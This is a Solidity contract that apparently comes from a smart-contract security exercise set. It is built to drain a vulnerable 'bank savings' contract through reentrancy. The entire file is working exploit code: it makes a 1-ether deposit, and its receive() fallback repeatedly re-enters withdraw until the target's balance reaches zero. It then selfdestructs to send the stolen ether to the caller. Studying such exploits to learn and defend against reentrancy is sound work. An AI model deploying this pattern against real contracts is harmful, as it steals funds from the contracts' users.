// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../interfaces/IReentrancyAttackOnBankSavings.sol";

contract ReentrancyAttackOnBankSavings {
    IReentrancyAttackOnBankSavings private immutable target;

    constructor(address _target) {
        target = IReentrancyAttackOnBankSavings(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
